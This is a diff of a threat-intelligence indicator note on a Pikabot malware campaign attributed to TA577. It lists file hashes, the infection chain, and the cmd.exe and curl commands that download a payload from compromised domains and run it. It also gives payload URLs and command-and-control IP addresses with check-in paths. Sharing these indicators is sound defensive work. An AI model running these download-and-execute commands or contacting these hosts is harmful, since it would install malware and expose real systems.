@@ -1,43 +1,43 @@
-09.02.2024 | Pikabot | TA577 | 1.8.32-beta
+12.02.2024 | Pikabot | TA577 | 1.1.17-ghost
 
 *************************************************
 
-.url https://cursosrdg.ccr.edu.pe/9nqrm/
-.zip a76ea4031064781902050026aabd55cc510577e3d31ca5908e92a35129cc2ce0
-.js 88c88cb96ee1124683bc3518d2dccb529bd850e7cec402db8839782995a63117
-.exe 555687ca3149e23ee980a3acf578e0572da556cf34c87aecf48596834d6b496f
+.js ce616c5d472d8d22169e1cabd8c99a511394b1c28febc944f427137a0354e8db
+.exe f4be945a6678a11bc4d2e3819cba8b91665eaf99e152cf0348e16d1fd94b2e75
 
 *************************************************
 
-url > zip > js > curl > .dll
+zip > js > curl > .dll
 
-wscript.exe C:\Users\Admin\AppData\Local\Temp\Notekx.js
+C:\Windows\system32\wscript.exe
 
-cmd.exe /c mkdir  C:\Dtjfjyfjfjyykgd\Zyjyjydfdhkgfi & curl https://ealthygradi.com/tS5/0.02608313237231047.dat --output C:\Dtjfjyfjfjyykgd\Zyjyjydfdhkgfi\Ifhfdhjkshfhjkgs.exe
+wscript.exe C:\Users\Admin\AppData\Local\Temp\magic.js
 
-curl https://ealthygradi.com/tS5/0.02608313237231047.dat --output C:\Dtjfjyfjfjyykgd\Zyjyjydfdhkgfi\Ifhfdhjkshfhjkgs.exe
+cmd.exe /c mkdir  C:\Ctjhkhgkgkdfhd\Djgkgkdfhdjf\Ktdhtfjfhdffkf & curl https://berringtonnews.com/0bvKZ/0.16410464051883017.dat --output C:\Ctjhkhgkgkdfhd\Djgkgkdfhdjf\Ktdhtfjfhdffkf\Ahjukktdtdj.exe
 
-cmd.exe /c mkdir  C:\Dtjfjyfjfjyykgd\Zyjyjydfdhkgfi & curl 0.9607346891162636.dat --output C:\Dtjfjyfjfjyykgd\Zyjyjydfdhkgfi\Ifhfdhjkshfhjkgs.exe
+curl https://berringtonnews.com/0bvKZ/0.16410464051883017.dat --output C:\Ctjhkhgkgkdfhd\Djgkgkdfhdjf\Ktdhtfjfhdffkf\Ahjukktdtdj.exe
 
-curl  0.9607346891162636.dat --output C:\Dtjfjyfjfjyykgd\Zyjyjydfdhkgfi\Ifhfdhjkshfhjkgs.exe
+cmd.exe /c mkdir  C:\Ctjhkhgkgkdfhd\Djgkgkdfhdjf\Ktdhtfjfhdffkf & curl 0.2432647238430553.dat --output C:\Ctjhkhgkgkdfhd\Djgkgkdfhdjf\Ktdhtfjfhdffkf\Ahjukktdtdj.exe
 
-cmd.exe /c mkdir  C:\Dtjfjyfjfjyykgd\Zyjyjydfdhkgfi & curl 0.4946220552225169.dat --output C:\Dtjfjyfjfjyykgd\Zyjyjydfdhkgfi\Ifhfdhjkshfhjkgs.exe
+curl 0.2432647238430553.dat --output C:\Ctjhkhgkgkdfhd\Djgkgkdfhdjf\Ktdhtfjfhdffkf\Ahjukktdtdj.exe
 
-curl  0.4946220552225169.dat --output C:\Dtjfjyfjfjyykgd\Zyjyjydfdhkgfi\Ifhfdhjkshfhjkgs.exe
+cmd.exe /c mkdir  C:\Ctjhkhgkgkdfhd\Djgkgkdfhdjf\Ktdhtfjfhdffkf & curl 0.34472296273090125.dat --output C:\Ctjhkhgkgkdfhd\Djgkgkdfhdjf\Ktdhtfjfhdffkf\Ahjukktdtdj.exe
 
-cmd.exe /c mkdir  C:\Dtjfjyfjfjyykgd\Zyjyjydfdhkgfi & curl 0.9709065170996424.dat --output C:\Dtjfjyfjfjyykgd\Zyjyjydfdhkgfi\Ifhfdhjkshfhjkgs.exe
+curl  0.34472296273090125.dat --output C:\Ctjhkhgkgkdfhd\Djgkgkdfhdjf\Ktdhtfjfhdffkf\Ahjukktdtdj.exe
 
-curl  0.9709065170996424.dat --output C:\Dtjfjyfjfjyykgd\Zyjyjydfdhkgfi\Ifhfdhjkshfhjkgs.exe
+cmd.exe /c mkdir  C:\Ctjhkhgkgkdfhd\Djgkgkdfhdjf\Ktdhtfjfhdffkf & curl 0.08171440546460101.dat --output C:\Ctjhkhgkgkdfhd\Djgkgkdfhdjf\Ktdhtfjfhdffkf\Ahjukktdtdj.exe
 
-cmd.exe /c mkdir  C:\Dtjfjyfjfjyykgd\Zyjyjydfdhkgfi & curl 0.1390333043518991.dat --output C:\Dtjfjyfjfjyykgd\Zyjyjydfdhkgfi\Ifhfdhjkshfhjkgs.exe
+curl 0.08171440546460101.dat --output C:\Ctjhkhgkgkdfhd\Djgkgkdfhdjf\Ktdhtfjfhdffkf\Ahjukktdtdj.exe
 
-curl  0.1390333043518991.dat --output C:\Dtjfjyfjfjyykgd\Zyjyjydfdhkgfi\Ifhfdhjkshfhjkgs.exe
+cmd.exe /c mkdir  C:\Ctjhkhgkgkdfhd\Djgkgkdfhdjf\Ktdhtfjfhdffkf & curl 0.9420635864377069.dat --output C:\Ctjhkhgkgkdfhd\Djgkgkdfhdjf\Ktdhtfjfhdffkf\Ahjukktdtdj.exe
 
-cmd.exe /c mkdir  C:\Dtjfjyfjfjyykgd\Zyjyjydfdhkgfi & curl 0.9028512036602045.dat --output C:\Dtjfjyfjfjyykgd\Zyjyjydfdhkgfi\Ifhfdhjkshfhjkgs.exe
+curl 0.9420635864377069.dat --output C:\Ctjhkhgkgkdfhd\Djgkgkdfhdjf\Ktdhtfjfhdffkf\Ahjukktdtdj.exe
 
-curl  0.9028512036602045.dat --output C:\Dtjfjyfjfjyykgd\Zyjyjydfdhkgfi\Ifhfdhjkshfhjkgs.exe
+cmd.exe /c mkdir  C:\Ctjhkhgkgkdfhd\Djgkgkdfhdjf\Ktdhtfjfhdffkf & curl 0.6819786227237544.dat --output C:\Ctjhkhgkgkdfhd\Djgkgkdfhdjf\Ktdhtfjfhdffkf\Ahjukktdtdj.exe
 
-cmd.exe /c timeout 10 & C:\Dtjfjyfjfjyykgd\Zyjyjydfdhkgfi\Ifhfdhjkshfhjkgs.exe
+curl 0.6819786227237544.dat --output C:\Ctjhkhgkgkdfhd\Djgkgkdfhdjf\Ktdhtfjfhdffkf\Ahjukktdtdj.exe
+
+cmd.exe /c timeout 10 & C:\Ctjhkhgkgkdfhd\Djgkgkdfhdjf\Ktdhtfjfhdffkf\Ahjukktdtdj.exe
 
 timeout  10 
 
@@ -45,94 +45,22 @@ timeout  10
 
 **** .dll distro ****
 
-https://wealthygradi.com/tS5/0.02608313237231047.dat
-https://professionalficars.com/t6F5Gi/0.04171104253786617.dat
-https://toptrinityblog.com/VUIhcGp/0.9941106282398995.dat
-https://muellerinfo.com/vnO/0.8133462062125514.dat
-https://allstocksinc.com/YDr/0.16553226537255283.dat
+https://berringtonnews.com/0bvKZ/0.16410464051883017.dat
+https://finderunion.com/CVv/0.7619553765651503.dat
+https://musicclubcompany.com/zmd/0.015044926305028627.dat
 
 *************************************************
 
 c2's
 
-104.129.55.103:2224
-178.18.246.136:2078
-158.220.80.167:2967
-104.129.55.104:2223
-23.226.138.161:5242
-37.60.242.85:9785
-23.226.138.143:2083
-37.60.242.86:2967
-85.239.243.155:5000
-158.220.80.157:9785
-
-HTTPS Check in
-
-https://37.60.242.86:2967/api/admin.apps.restrict
-https://23.226.138.143:2083/api/admin.apps.requests.list
-https://37.60.242.85:9785/api/admin.conversations.unarchive
-https://23.226.138.161:5242/api/admin.apps.restrict
-https://158.220.80.167:2967/api/admin.conversations.setTeams
-https://85.239.243.155:5000/api/apps.permissions.users.request
-https://37.60.242.86:2967/api/admin.usergroups.addTeams
-https://23.226.138.143:2083/api/admin.usergroups.addTeams
-https://23.226.138.161:5242/api/admin.usergroups.addTeams
-https://158.220.80.167:2967/api/admin.conversations.invite
-https://178.18.246.136:2078/api/admin.apps.restrict
-https://85.239.243.155:5000/api/admin.apps.restrict
-https://23.226.138.143:2083/api/admin.apps.restrict
-https://37.60.242.85:9785/api/admin.users.session.reset
-https://158.220.80.167:2967/api/admin.apps.requests.list
-https://178.18.246.136:2078/api/admin.conversations.unarchive
-https://85.239.243.155:5000/api/admin.users.session.reset
-https://37.60.242.86:2967/api/admin.conversations.invite
-https://23.226.138.143:2083/api/admin.users.list
-https://37.60.242.85:9785/api/admin.conversations.setTeams
-https://23.226.138.161:5242/api/admin.conversations.invite
-https://178.18.246.136:2078/api/admin.users.list
-https://37.60.242.86:2967/api/admin.conversations.unarchive
-https://23.226.138.143:2083/api/admin.conversations.unarchive
-https://37.60.242.85:9785/api/admin.usergroups.addTeams
-https://23.226.138.161:5242/api/admin.conversations.unarchive
-https://158.220.80.167:2967/api/admin.apps.restrict
-https://85.239.243.155:5000/api/admin.conversations.setTeams
-https://37.60.242.86:2967/api/admin.users.session.reset
-https://37.60.242.85:9785/api/apps.permissions.users.request
-https://23.226.138.161:5242/api/admin.usergroups.removeChannels
-https://158.220.80.167:2967/api/admin.conversations.unarchive
-https://178.18.246.136:2078/api/admin.usergroups.removeChannels
-https://37.60.242.86:2967/api/admin.conversations.setTeams
-https://23.226.138.143:2083/api/apps.permissions.users.request
-https://37.60.242.85:9785/api/admin.usergroups.removeChannels
-https://23.226.138.161:5242/api/admin.users.list
-https://158.220.80.167:2967/api/admin.usergroups.addTeams
-https://178.18.246.136:2078/api/apps.permissions.users.request
-https://85.239.243.155:5000/api/admin.conversations.invite
-https://37.60.242.86:2967/api/admin.users.list
-https://178.18.246.136:2078/api/admin.users.session.reset
-https://85.239.243.155:5000/api/admin.users.setOwner
-https://37.60.242.86:2967/api/admin.apps.requests.list
-https://37.60.242.85:9785/api/admin.apps.requests.list
-https://23.226.138.161:5242/api/admin.users.setOwner
-https://158.220.80.167:2967/api/admin.users.setOwner
-https://23.226.138.143:2083/api/admin.users.session.reset
-https://158.220.80.167:2967/api/admin.usergroups.removeChannels
-https://85.239.243.155:5000/api/admin.usergroups.removeChannels
-https://85.239.243.155:5000/api/admin.conversations.unarchive
-https://37.60.242.86:2967/api/admin.usergroups.removeChannels
-https://23.226.138.143:2083/api/admin.usergroups.removeChannels
-https://37.60.242.85:9785/api/admin.apps.restrict
-https://23.226.138.161:5242/api/admin.apps.requests.list
-https://37.60.242.85:9785/api/admin.users.setOwner
-https://85.239.243.155:5000/api/admin.users.list
-https://37.60.242.85:9785/api/admin.users.list
-https://158.220.80.167:2967/api/admin.users.session.reset
-https://178.18.246.136:2078/api/admin.conversations.invite
-https://23.226.138.161:5242/api/apps.permissions.users.request
-https://158.220.80.167:2967/api/apps.permissions.users.request
-https://178.18.246.136:2078/api/admin.apps.requests.list
-https://37.60.242.86:2967/api/apps.permissions.users.request
-https://158.220.80.167:2967/api/admin.users.list
-https://85.239.243.155:5000/api/admin.conversations.setTeams
+https://37.60.242.86:2967
+https://23.226.138.161:5242
+https://37.60.242.85:9785
+https://86.38.225.108:2226
+https://178.18.246.136:2078
+https://86.38.225.106:2221
+https://86.38.225.105:13721
+https://23.226.138.143:2083
+https://85.239.243.155:5000
 
 *************************************************
